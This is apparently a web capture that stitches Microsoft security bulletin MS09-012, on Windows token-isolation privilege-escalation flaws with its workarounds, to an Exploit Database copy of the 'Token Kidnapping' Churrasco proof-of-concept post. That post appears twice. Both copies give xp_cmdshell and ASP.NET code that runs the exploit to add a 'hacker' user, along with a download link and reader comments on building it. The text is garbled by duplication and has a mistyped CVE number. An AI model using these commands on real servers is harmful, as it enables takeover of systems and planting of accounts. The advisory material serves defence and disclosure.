# Microsoft Security Bulletin MS09-012 - Important

## Vulnerabilities in Windows Could Allow Elevation of Privilege (959454)

Published: April 14, 2009 | Updated: April 29, 2009

**Version:** 2.0

### General Information

#### Executive Summary

This security update resolves four publicly disclosed vulnerabilities in Microsoft Windows. The vulnerabilities could allow elevation of privilege if an attacker is allowed to log on to the system and then run a specially crafted application. The attacker must be able to run code on the local machine in order to exploit this vulnerability. An attacker who successfully exploited any of these vulnerabilities could take complete control over the affected system.

This security update is rated Important for all supported editions of Microsoft Windows 2000, Windows XP, Windows Server 2003, Windows Vista, and Windows Server 2008. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses the vulnerabilities by correcting the way that Microsoft Windows addresses tokens requested by the Microsoft Distributed Transaction Coordinator (MSDTC), and by properly isolating WMI providers and processes that run under the NetworkService or LocalService accounts. For more information about the vulnerabilities, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

This security update also addresses the vulnerability first described in [Microsoft Security Advisory 951306](https://technet.microsoft.com/security/advisory/951306).

**Recommendation.** The majority of customers have automatic updating enabled and will not need to take any action because this security update will be downloaded and installed automatically. Customers who have not enabled automatic updating need to check for updates and install this update manually. For information about specific configuration options in automatic updating, see [Microsoft Knowledge Base Article 294871](https://support.microsoft.com/kb/294871).

For administrators and enterprise installations, or end users who want to install this security update manually, Microsoft recommends that customers apply the update at the earliest opportunity using update management software, or by checking for updates using the [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747) service.

See also the section, **Detection and Deployment Tools and Guidance**, later in this bulletin.

**Known Issues.** [Microsoft Knowledge Base Article 959454](https://support.microsoft.com/kb/959454) documents the currently known issues that customers may experience when installing this security update. The article also documents recommended solutions for these issues.

#### Affected and Non-Affected Software

The following software have been tested to determine which versions or editions are affected. Other versions or editions are either past their support life cycle or are not affected.

## Frequently Asked Questions (FAQ) Related to This Security Update

**Why was this bulletin revised on April 29, 2009?**

Microsoft revised this bulletin to communicate the rerelease of the Norwegian-language update for Microsoft Windows 2000 Service Pack 4 (KB952004) to fix a quality issue that could cause the installation to fail. Customers who have downloaded and attempted to install the Norwegian-language update need to download and install the rereleased update to be protected from the vulnerabilities described in this bulletin. No other updates or locales are affected by this rerelease.

**Why was this bulletin revised on April 22, 2009?**

This bulletin was revised to communicate that the **Known issues with this security update** section referenced in the associated [Microsoft Knowledge Base Article 959454](https://support.microsoft.com/kb/959454) has been updated to describe an application compatibility issue with this update and systems running Microsoft Internet Security and Acceleration (ISA) Server 2000 Standard Edition, Microsoft Internet Security and Acceleration (ISA) Server 2004 Standard Edition, or Microsoft Internet Security and Acceleration (ISA) Server 2006 Standard Edition.

**Where are the file information details?**

The file information details can be found in [Microsoft Knowledge Base Article 959454](https://support.microsoft.com/kb/959454).

**What are the known issues that customers may experience when installing this security update?**

[Microsoft Knowledge Base Article 959454](https://support.microsoft.com/kb/959454) documents the currently known issues that customers may experience when they install this security update. The article also documents recommended solutions for these issues.

**Why does this bulletin contain two updates for each affected operating system?**

This bulletin contains two updates, identified by KB number, for all affected operating systems. Customers of Microsoft Windows 2000 only need to apply update package KB952004. Customers running other affected operating systems need to apply security update packages KB952004 and KB956572 for each operating system as applies in their environment.

The two updates are necessary for most affected operating systems because the modifications that are required to address the vulnerabilities are located in separate components. KB952004 addresses the publicly known issue in the MSDTC transaction facility. KB956572 provides the architectural changes needed to ensure proper service isolation across other services on Windows platforms.

**Why does this update address several reported security vulnerabilities?**

This update contains support for several vulnerabilities because the modifications that are required to address these issues are located in related files. Instead of having to install several updates that are almost the same, customers need to install this update only.

**Does this update contain any security-related changes to functionality?**

Yes. Besides the changes that are listed in the **Vulnerability Information** section of this bulletin, this security update also provides an infrastructure to isolate and secure services. In Windows XP and Windows Server 2003, all processes running under the context of a single account will have full control over each other. This update provides third parties the ability to isolate and secure their services that hold SYSTEM tokens and run under the NetworkService or LocalService accounts. For more information on the usage of this registry key, see [Microsoft Knowledge Base Article 956572](https://support.microsoft.com/kb/956572).

**I am using an older release of the software discussed in this security bulletin. What should I do?**

The affected software listed in this bulletin have been tested to determine which releases are affected. Other releases are past their support life cycle. To determine the support life cycle for your software release, visit [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

#### FAQ for Windows MSDTC Service Isolation Vulnerability - CVE-2008-1436

**What is the scope of the vulnerability?**

This is an elevation of privilege vulnerability. An attacker who successfully exploited this vulnerability could execute arbitrary code with NetworkService privileges. An attacker could then obtain the LocalSystem token from other vulnerable services and install programs; view, change, or delete data; or create new accounts with full user rights.

**What causes the vulnerability?**

The vulnerability is due to the Microsoft Distributed Transaction Coordinator (MSDTC) transaction facility allowing the NetworkService token to be obtained and used when making an RPC call.

**What is the Microsoft Distributed Transaction Coordinator?**

The Microsoft Distributed Transaction Coordinator (MSDTC) is a distributed transaction facility for Microsoft Windows platforms. MSDTC uses proven transaction processing technology. It is robust despite system failures, process failures, and communication failures; it exploits loosely coupled systems to provide scalable performance; and it is easy to install, configure, and manage.

For more information about MSDTC, see the MSDN article, [DTC Developers Guide](https://msdn2.microsoft.com/library/ms679938.aspx).

**What is RPC?**

Remote Procedure Call (RPC) is a protocol that a program can use to request a service from a program located on another computer in a network. RPC helps with interoperability because the program using RPC does not have to understand the network protocols that are supporting communication. In RPC, the requesting program is the client and the service-providing program is the server.

**What is the NetworkService Account?**

The NetworkService account is a predefined local account used by the service control manager. It has minimum privileges on the local computer and acts as the computer on the network. A service that runs in the context of the NetworkService account presents the computer's credentials to remote servers. For more information, see the MSDN article, [NetworkService Account](https://msdn.microsoft.com/library/ms684272%28vs.85%29.aspx).

**What is the LocalService Account?**

The LocalService account is a predefined local account used by the service control manager. It has minimum privileges on the local computer and presents anonymous credentials on the network. For information, see the MSDN article, [LocalService Account](https://msdn.microsoft.com/library/ms684188%28vs.85%29.aspx).

**What is the LocalSystem Account?**

The LocalSystem account is a predefined local account used by the service control manager. It has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the NT AUTHORITY\SYSTEM and BUILTIN\Administrators SIDs; these accounts have access to most system objects. A service that runs in the context of the LocalSystem account inherits the security context of the Service Control Manager. Most services do not need such a high privilege level. For more information, see the MSDN article, [LocalSystem Account](https://msdn.microsoft.com/library/ms684190.aspx).

**How is IIS affected by this issue?**

Systems running user-provided code in Internet Information Services (IIS) may be affected. For example ISAPI filters and extensions, and ASP.NET code running in full trust may be affected by this vulnerability.

IIS is not affected in the following scenarios:

* Default Installations of IIS 5.1, IIS 6.0, and IIS 7.0
* ASP.NET configured to run with a trust level lower than Full Trust

**How is SQL Server affected by this issue?**

Systems running SQL Server may be affected if a user is granted administrative privileges to load and run code. A user with SQL Server administrator privileges could execute specially crafted code that could leverage the attack. However, this privilege is not granted by default.

**What additional applications may be affected by this vulnerability?**

Systems running any process with SeImpersonatePrivilege that loads and runs user-provided code may be susceptible to an elevation of privilege attack as described in this security bulletin. The SeImpersonatePrivilege setting is described in Microsoft Knowledge Base Article 821546.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could run specially crafted code in the context of the NetworkService account. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

**How could an attacker exploit the vulnerability?**

To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take complete control over the affected system.

**What systems are primarily at risk from the vulnerability?**

Workstations and terminal servers are primarily at risk. Servers could be at more risk if users who do not have administrative permissions are given the ability to log on to servers and to run programs. However, best practices strongly discourage allowing this.

All systems running all supported editions of Windows XP Professional Service Pack 2 and Windows XP Professional Service Pack 3, and all supported versions and editions of Windows Server 2003, Windows Vista, and Windows Server 2008 may be at risk if IIS is enabled or SQL Server is installed and configured or deployed in a vulnerable state as described in this bulletin.

In addition, IIS systems that allow users to upload code are at increased risk. SQL Server systems are at risk if untrusted users are granted privileged account access. This may include Web hosting providers or similar environments.

#### FAQ for Windows WMI Service Isolation Vulnerability - CVE-2009-0078

**What is the scope of the vulnerability?**

This is an elevation of privilege vulnerability. An attacker who successfully exploited this vulnerability could execute arbitrary code with the same privileges as the LocalSystem account. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

**What causes the vulnerability?**

The vulnerability is due to Windows Management Instrumentation (WMI) provider improperly isolating processes that run under the NetworkService or LocalService accounts. Two separate processes running under same account have full access to each otherâs resources such as file handle, registry keys, handles,and so on. The WMI provider host process holds SYSTEM Tokens in certain scenarios. If an attacker gains access to a computer under the context of a NetworkService or LocalService account, the attacker can execute code to probe the WMI provider host processes for SYSTEM tokens. Once a SYSTEM token is found, the attacker's code can use it to gain SYSTEM level privileges.

**What is the Windows Management Instrumentation (WMI)?**

Windows Management Instrumentation (WMI) is the primary management technology for Microsoft Windows operating systems. It enables consistent and uniform management, control, and monitoring of systems throughout your enterprise. WMI allows system administrators to query, change, and monitor configuration settings on desktop and server systems, applications, networks, and other enterprise components.

#### FAQ for Windows RPCSS Service Isolation Vulnerability - CVE-009-0079

**What is the scope of the vulnerability?**

This is an elevation of privilege vulnerability. An attacker who successfully exploited this vulnerability could execute arbitrary code with LocalSystem privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

**What causes the vulnerability?**

The vulnerability is due to the RPCSS service improperly isolating processes that run under the NetworkService or LocalService accounts.

**What is RPC?**

Remote Procedure Call (RPC) is a protocol that a program can use to request a service from a program located on another computer in a network. RPC helps with interoperability because the program using RPC does not have to understand the network protocols that are supporting communication. In RPC, the requesting program is the client and the service-providing program is the server.

**What is the NetworkService Account?**

The NetworkService account is a predefined local account used by the service control manager. It has minimum privileges on the local computer and acts as the computer on the network. A service that runs in the context of the NetworkService account presents the computer's credentials to remote servers. For more information, see the MSDN article, [Network Service Account](https://msdn.microsoft.com/library/ms684272%28vs.85%29.aspx).

**What is the LocalService Account?**

The LocalService account is a predefined local account used by the service control manager. It has minimum privileges on the local computer and presents anonymous credentials on the network. For information, see the MSDN article, [LocalService Account](https://msdn.microsoft.com/library/ms684188%28vs.85%29.aspx).

**What is the LocalSystem Account?**

The LocalSystem account is a predefined local account used by the service control manager. It has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the NT AUTHORITY\SYSTEM and BUILTIN\Administrators SIDs; these accounts have access to most system objects. A service that runs in the context of the LocalSystem account inherits the security context of the [Service Control Manager](https://msdn.microsoft.com/library/ms685150%28vs.85%29.aspx). Most services do not need such a high privilege level. For more information, see the MSDN article, [LocalSystem Account](https://msdn.microsoft.com/library/ms684190.aspx).

**How is IIS affected by this issue?**

Systems running user-provided code in Internet Information Services (IIS) may be affected. For example ISAPI filters and extensions, and ASP.NET code running in full trust may be affected by this vulnerability.

IIS is not affected in the following scenarios:

* Default Installations of IIS 5.1, IIS 6.0, and IIS 7.0
* ASP.NET configured to run with a trust level lower than Full Trust

**How is SQL Server affected by this issue?**

Systems running SQL Server may be affected if a user is granted administrative privileges to load and run code. A user with SQL Server administrator privileges could execute specially crafted code that could leverage the attack. However, this privilege is not granted by default.

**What additional applications may be affected by this vulnerability?**

Systems running any process with SeImpersonatePrivilege that loads and runs user-provided code may be susceptible to an elevation of privilege attack as described in this security bulletin. The SeImpersonatePrivilege setting is described in [Microsoft Knowledge Base Article 821546](https://support.microsoft.com/kb/821546).

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could run specially crafted code in the context of the NetworkService or LocalService accounts that could gain access to resources in processes that are also running as NetworkService or LocalService. Some of these processes may have the ability to elevate their privileges to LocalSystem, allowing any NetworkService or LocalService processes to elevate their privileges to LocalSystem as well. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

**How could an attacker exploit the vulnerability?**

To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take complete control over the affected system.

**What systems are primarily at risk from the vulnerability?**

Workstations and terminal servers are primarily at risk. Servers could be at more risk if users who do not have sufficient administrative permissions are given the ability to log on to servers and to run programs. However, best practices strongly discourage allowing this.

All systems running Windows XP Professional Service Pack 2, Windows XP Professional Service Pack 3, and all supported versions and editions of Windows Server 2003 may be at risk if IIS is enabled or SQL Server is installed and configured or deployed in a vulnerable state as described by this bulletin.

In addition, IIS systems that allow users to upload code are at increased risk. SQL Server systems are at risk if untrusted users are granted privileged account access. This may include Web hosting providers or similar environments.

**What does the update do?**

The update addresses the vulnerability by properly isolating processes that run under the NetworkService or LocalService accounts.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

Yes. This vulnerability has been publicly disclosed. It has been assigned Common Vulnerability and Exposure number [CVE-2009-0079](https://www.cve.org/CVERecord?id=CVE-2009-0079).

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

Yes. Microsoft is aware of limited, targeted attacks attempting to exploit the vulnerability.

## Windows Thread Pool ACL Weakness Vulnerability - CVE-2009-0080

An elevation of privilege vulnerability exists due to Windows placing incorrect access control lists (ACLs) on threads in the current ThreadPool. The vulnerability could allow an attacker to run code with elevated privileges. An attacker who successfully exploited this vulnerability could execute arbitrary code and take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2009-0080](https://www.cve.org/CVERecord?id=CVE-2009-0080).

#### Mitigating Factors for Windows Thread Pool ACL Weakness Vulnerability - CVE- 2009-0080

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* The attacker must be able to run code on the local machine to exploit this vulnerability. An attacker who successfully exploited this vulnerability could gain the same user rights as the LocalSystem service.

#### Workarounds for Windows Thread Pool ACL Weakness Vulnerability - CVE-2009-0080

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **IIS 6.0 - Configure a Worker Process Identity (WPI) for an application pool in IIS to use a created account in IIS Manager and disable MSDTC**

  Perform the following steps:

  1. In IIS Manager, expand the local computer, expand **Application Pools**, right-click the application pool and select **Properties**.
  2. Click the **Identity** tab and click **Configurable**. In the **User name** and **Password** boxes, type the user name and password of the account under which you want the worker process to operate.
  3. Add the chosen user account to the IIS\_WPG group.

  Disabling the Distributed Transaction Coordinator will help protect the affected system from attempts to exploit this vulnerability. To disable the Distributed Transaction Coordinator, perform these steps:

  1. Click **Start**, and then click **Control Panel**. Alternatively, point to **Settings**, and then click **Control Panel**.
  2. Double-click **Administrative Tools**. Alternatively, click **Switch to Classic View** and then double-click **Administrative Tools**.
  3. Double-click **Services**.
  4. Double-click **Distributed Transaction Coordinator**.
  5. In the **Startup** type list, click **Disabled**.
  6. Click **Stop** (if started), and then click **OK**.

  You can also stop and disable the MSDTC service by using the following command at the command prompt:

  sc stop MSDTC & sc config MSDTC start= disabled

  **Impact of Workaround:** Managing the additional user accounts created in this workaround results in increased administrative overhead. Depending on the nature of applications running in this application pool, application functionality may be affected. An example is Windows Authentication; see [Microsoft Knowledge Base Article 871179](https://support.microsoft.com/kb/871179). Disabling MSDTC will prevent applications from using distributed transactions. Disabling MSDTC will prevent IIS 5.1 from running in Windows XP Professional Service Pack 2 and Windows XP Professional Service Pack 3, and IIS 6.0 running in IIS 5.0 compatibility mode. Disabling MSDTC will prevent configuration as well as running of COM+ applications.
* **IIS 7.0 - Specify a WPI for an application pool in IIS Manager**

  1. In IIS Manager, expand the server node, click **Application Pools**, right-click the application pool, and then click **Advanced Settingsâ¦**
  2. Find the **Identity** entry, and click the **â¦** button to open the **Application Pool Identity** dialog box.
  3. Select the **Custom account** option and click **Set** to open the **Set Credentials** dialog box. Type in the selected **Account name** and **Password** in the user name and password text boxes. Retype the Password in the **Confirm password** text box, then click **OK**.

  **Note** Application pool identities are dynamically added to IIS\_WPG group in IIS7 and donât need to be manually added.

  **Impact of Workaround:** Managing the additional user accounts created in this workaround results in increased administrative overhead. Depending on the nature of applications running in this application pool, application functionality may be affected.
* **IIS 7.0 - Specify a WPI for an application pool using the Command Line utility APPCMD.exe**

  1. From an elevated command prompt, change to the %systemroot%\system32\inetsrv directory.
  2. Execute the APPCMD.exe command using the following syntax where *string* is the name of the application pool; userName:*string* is the user name of the account assigned to the application pool; and password:*string* is the password for the account.

     appcmd set config /section:applicationPools /

     [name='string'].processModel.identityType:SpecificUser /

     [name='string'].processModel.userName:string /

     [name='string'].processModel.password:string

  **Note** Application pool identities are dynamically added to IIS\_WPG group in IIS 7.0 and do not need to be manually added.

  **Impact of Workaround:** Managing the additional user accounts created in this workaround results in increased administrative overhead. Depending on the nature of applications running in this application pool, application functionality may be affected.

#### FAQ for Windows Thread Pool ACL Weakness Vulnerability - CVE-2009-0080

**What is the scope of the vulnerability?**

This is an elevation of privilege vulnerability. An attacker who successfully exploited this vulnerability could execute arbitrary code with LocalSystem privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

**What causes the vulnerability?**

The vulnerability is due to Windows placing incorrect access control lists (ACLs) on threads in the current ThreadPool.

**What is the Windows ThreadPool Class?**

The Windows ThreadPool class provides a pool of threads that can be used to post work items, process asynchronous I/O, wait on behalf of other threads, and process timers. Many applications create threads that spend a great deal of time in the sleeping state, waiting for an event to occur. Other threads might enter a sleeping state only to be awakened periodically to poll for a change or update status information. Thread pooling enables you to use threads more efficiently by providing your application with a pool of worker threads that are managed by the system. One thread monitors the status of several wait operations queued to the thread pool. When a wait operation completes, a worker thread from the thread pool executes the corresponding callback function. For more information, see the MSDN article, [ThreadPool Class](https://msdn.microsoft.com/library/system.threading.threadpool.aspx).

**What is an Access Control List (ACL)?**

An access control list (ACL) is a list of security protections that applies to an object. An object can be a file, process, event, or anything else having a security descriptor. An entry in an ACL is an access control entry (ACE). There are two types of access control list, discretionary and system. Each ACE in an ACL identifies access rights allowed, denied, or audited for that trustee. For information, see the MSDN article, [Access Control Lists](https://msdn.microsoft.com/library/aa374872%28vs.85%29.aspx).

**What is the NetworkService Account?**

The NetworkService account is a predefined local account used by the service control manager. It has minimum privileges on the local computer and acts as the computer on the network. A service that runs in the context of the NetworkService account presents the computer's credentials to remote servers. For more information, see the MSDN article, [Network Service Account](https://msdn.microsoft.com/library/ms684272%28vs.85%29.aspx).

#### Deployment Information

**Installing the Update**

When you install this security update, the installer checks whether one or more of the files that are being updated on your system have previously been updated by a Microsoft hotfix.

If you have previously installed a hotfix to update one of these files, the installer copies the RTMQFE, SP1QFE, or SP2QFE files to your system. Otherwise, the installer copies the RTMGDR, SP1GDR, or SP2GDR files to your system. Security updates may not contain all variations of these files. For more information about this behavior, see [Microsoft Knowledge Base Article 824994](https://support.microsoft.com/kb/824994).

For more information about the installer, visit the [Microsoft TechNet Web site](https://go.microsoft.com/fwlink/?linkid=38951).

**Verifying That the Update Has Been Applied**

* **Microsoft Baseline Security Analyzer**

  To verify that a security update has been applied to an affected system, you may be able to use the Microsoft Baseline Security Analyzer (MBSA) tool. See the section, **Detection and Deployment Tools and Guidance**, earlier in this bulletin for more information.
* **File Version Verification**

  Because there are several editions of Microsoft Windows, the following steps may be different on your system. If they are, see your product documentation to complete these steps.

  1. Click **Start**, and then click **Search**.
  2. In the **Search Results** pane, click **All files and folders** under **Search Companion**.
  3. In the **All or part of the file name** box, type a file name from the appropriate file information table, and then click **Search**.
  4. In the list of files, right-click a file name from the appropriate file information table, and then click **Properties**.
     **Note** Depending on the edition of the operating system, or the programs that are installed on your system, some of the files that are listed in the file information table may not be installed.
  5. On the **Version** tab, determine the version of the file that is installed on your system by comparing it to the version that is documented in the appropriate file information table.
     **Note** Attributes other than the file version may change during installation. Comparing other file attributes to the information in the file information table is not a supported method of verifying that the update has been applied. Also, in certain cases, files may be renamed during installation. If the file or version information is not present, use one of the other available methods to verify update installation.
* **Registry Key Verification**

  You may also be able to verify the files that this security update has installed by reviewing the registry keys listed in the **Reference Table** in this section.

  These registry keys may not contain a complete list of installed files. Also, these registry keys may not be created correctly when an administrator or an OEM integrates or slipstreams this security update into the Windows installation source files.

#### Deployment Information

**Installing the Update**

When you install this security update, the installer checks whether one or more of the files that are being updated on your system have previously been updated by a Microsoft hotfix.

If you have previously installed a hotfix to update one of these files, the installer copies the RTMQFE, SP1QFE, or SP2QFE files to your system. Otherwise, the installer copies the RTMGDR, SP1GDR, or SP2GDR files to your system. Security updates may not contain all variations of these files. For more information about this behavior, see [Microsoft Knowledge Base Article 824994](https://support.microsoft.com/kb/824994).

For more information about the installer, visit the [Microsoft TechNet Web site](https://go.microsoft.com/fwlink/?linkid=38951).

For more information about the terminology that appears in this bulletin, such as *hotfix*, see [Microsoft Knowledge Base Article 824684](https://support.microsoft.com/kb/824684).

This security update supports the following setup switches.

| Switch | Description |
| --- | --- |
| **/help** | Displays the command-line options. |
| Setup Modes |  |
| **/passive** | Unattended Setup mode. No user interaction is required, but installation status is displayed. If a restart is required at the end of Setup, a dialog box will be presented to the user with a timer warning that the computer will restart in 30 seconds. |
| **/quiet** | Quiet mode. This is the same as unattended mode, but no status or error messages are displayed. |
| Restart Options |  |
| **/norestart** | Does not restart when installation has completed. |
| **/forcerestart** | Restarts the computer after installation and force other applications to close at shutdown without saving open files first. |
| **/warnrestart[:x]** | Presents a dialog box with a timer warning the user that the computer will restart in *x* seconds. (The default setting is 30 seconds.) Intended for use with the **/quiet** switch or the **/passive** switch. |
| **/promptrestart** | Displays a dialog box prompting the local user to allow a restart. |
| Special Options |  |
| **/overwriteoem** | Overwrites OEM files without prompting. |
| **/nobackup** | Does not back up files needed for uninstall. |
| **/forceappsclose** | Forces other programs to close when the computer shuts down. |
| **/log:path** | Allows the redirection of installation log files. |
| **/integrate:path** | Integrates the update into the Windows source files. These files are located at the path that is specified in the switch. |
| **/extract[:path]** | Extracts files without starting the Setup program. |
| **/ER** | Enables extended error reporting. |
| **/verbose** | Enables verbose logging. During installation, creates %Windir%\CabBuild.log. This log details the files that are copied. Using this switch may cause the installation to proceed more slowly. |

**Note** You can combine these switches into one command. For backward compatibility, the security update also supports the setup switches that the earlier version of the Setup program uses. For more information about the supported installation switches, see [Microsoft Knowledge Base Article 262841](https://support.microsoft.com/kb/262841).

```
(From http://nomoreroot.blogspot.com/2008/10/windows-2003-poc-exploit-for-token.html)

It has been a long time since Token Kidnapping presentation (http://www.argeniss.com/research/TokenKidnapping.pdf)
was published so I decided to release a PoC exploit for Win2k3 that alows to execute code under SYSTEM account.

Basically if you can run code under any service in Win2k3 then you can own Windows, this is because Windows
services accounts can impersonate.  Other process (not services) that can impersonate are IIS 6 worker processes
so if you can run code from an ASP .NET or classic ASP web application then you can own Windows too. If you provide
shared hosting services then I would recomend to not allow users to run this kind of code from ASP.

-SQL Server is a nice target for the exploit if you are a DBA and want to own Windows:

exec xp_cmdshell 'churrasco "net user /add hacker"'

-Exploiting IIS 6 with ASP .NET :
...
System.Diagnostics.Process myP = new System.Diagnostics.Process();
myP.StartInfo.RedirectStandardOutput = true;
myP.StartInfo.FileName=Server.MapPath("churrasco.exe");
myP.StartInfo.UseShellExecute = false;
myP.StartInfo.Arguments= " \"net user /add hacker\" ";
myP.Start();
string output = myP.StandardOutput.ReadToEnd();
Response.Write(output);
...

You can find the PoC exploit here http://www.argeniss.com/research/Churrasco.zip

Enjoy.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### Token Kidnapping Windows 2003 PoC exploit

It has been a long time since Token Kidnapping presentation (<http://www.argeniss.com/research/TokenKidnapping.pdf>) was published so I decided to release a PoC exploit for Win2k3 that alows to execute code under SYSTEM account.

Basically if you can run code under any service in Win2k3 then you can own Windows, this is because Windows services accounts can impersonate.
Other process (not services) that can impersonate are IIS 6 worker processes so if you can run code from an ASP .NET or classic ASP web application then you can own Windows too. If you provide shared hosting services then I would recomend to not allow users to run this kind of code from ASP.

-SQL Server is a nice target for the exploit if you are a DBA and want to own Windows:

exec xp\_cmdshell 'churrasco "net user /add hacker"'

-Exploiting IIS 6 with ASP .NET :
...
System.Diagnostics.Process myP = new System.Diagnostics.Process();
myP.StartInfo.RedirectStandardOutput = true;
myP.StartInfo.FileName=Server.MapPath("churrasco.exe");
myP.StartInfo.UseShellExecute = false;
myP.StartInfo.Arguments= " \"net user /add hacker\" ";
myP.Start();
string output = myP.StandardOutput.ReadToEnd();
Response.Write(output);
...

You can find the PoC exploit here <http://www.argeniss.com/research/Churrasco.zip>

Enjoy.

Hi Cesar

So you`ve finally decided to publish the PoC publicly .I've not seen a fix for this from Microsoft since first disclose of such attacks , yours being the most noisy one. All I see are temporary workarounds or advices on how to do what. The problem about such critical flaws is that , not all sys admins follow sec lists nor check latest published KB articles by Microsoft,so after so long time I`ve not yet seen any major change in configurations which means tens of thousands of vulnerable systems.
Any news from MS side about this case ?

Hi Hamid

Hi haven't had news from MS about these issues, I don't know when they are going to fix them.
I don't think this is a critical flaw. Basically it's an easy way of elevating privileges when you have impersonation rights but without this exploit it's still possible to elevate privileges in certain circunstances just using regular functionality, ie: an administrator authenticates to a service or to IIS and then it's impersonated.

Hi,

I've tried to compile the churrasco.exe but I've got the following error:

1>Linking...
1>Churrasco.obj : error LNK2019: unresolved external symbol \_DtcGetTransactionManagerExA referenced in function "int \_\_cdecl InvokeMSDTC(void)" (?InvokeMSDTC@@YAHXZ)
1>Release/Churrasco.exe : fatal error LNK1120: 1 unresolved externals

I'm using VC++ express 2008 from MS on an XP machine.
Any advise?

3l51k4n0, I tried with VC++ express 2008 and it works fine. Maybe you are getting some problems with conversion since it's a Visual Studio 2003 project but I converted it with defaults and it works.

Having trouble producing the expected output; I started with an out-of-the-box Win2K3 Standard Edition SP0 install for my initial conditions. Launched from a LOCAL SERVICE (S-1-5-19) service shell; here's group and privileges of the parent process token:

Token SIDs: (10)
 S-1-5-19 = 0x00000000
 S-1-5-19 = 0x00000007 = SE\_GROUP\_MANDATORY+SE\_GROUP\_ENABLED\_BY\_DEFAULT+SE\_GROUP\_ENABLED
 S-1-1-0 = 0x00000007 = SE\_GROUP\_MANDATORY+SE\_GROUP\_ENABLED\_BY\_DEFAULT+SE\_GROUP\_ENABLED
 S-1-5-32-545 = 0x00000007 = SE\_GROUP\_MANDATORY+SE\_GROUP\_ENABLED\_BY\_DEFAULT+SE\_GROUP\_ENABLED
 S-1-5-6 = 0x00000007 = SE\_GROUP\_MANDATORY+SE\_GROUP\_ENABLED\_BY\_DEFAULT+SE\_GROUP\_ENABLED
 S-1-5-11 = 0x00000007 = SE\_GROUP\_MANDATORY+SE\_GROUP\_ENABLED\_BY\_DEFAULT+SE\_GROUP\_ENABLED
 S-1-5-15 = 0x00000007 = SE\_GROUP\_MANDATORY+SE\_GROUP\_ENABLED\_BY\_DEFAULT+SE\_GROUP\_ENABLED
 S-1-2-0 = 0x00000007 = SE\_GROUP\_MANDATORY+SE\_GROUP\_ENABLED\_BY\_DEFAULT+SE\_GROUP\_ENABLED
 S-1-5-5-0-1368877 = 0xc0000007 = SE\_GROUP\_MANDATORY+SE\_GROUP\_ENABLED\_BY\_DEFAULT+SE\_GROUP\_ENABLED+SE\_GROUP\_LOGON\_ID
 S-1-5-32-545 = 0x00000007 = SE\_GROUP\_MANDATORY+SE\_GROUP\_ENABLED\_BY\_DEFAULT+SE\_GROUP\_ENABLED

Token privileges: (6)
 SeAuditPrivilege = 0x00000000
 SeIncreaseQuotaPrivilege = 0x00000000 SeAssignPrimaryTokenPrivilege = 0x00000000
 SeChangeNotifyPrivilege = 0x00000003 = SE\_PRIVILEGE\_ENABLED\_BY\_DEFAULT+SE\_PRIVILEGE\_ENABLED
 SeImpersonatePrivilege = 0x00000003 = SE\_PRIVILEGE\_ENABLED\_BY\_DEFAULT+SE\_PRIVILEGE\_ENABLED
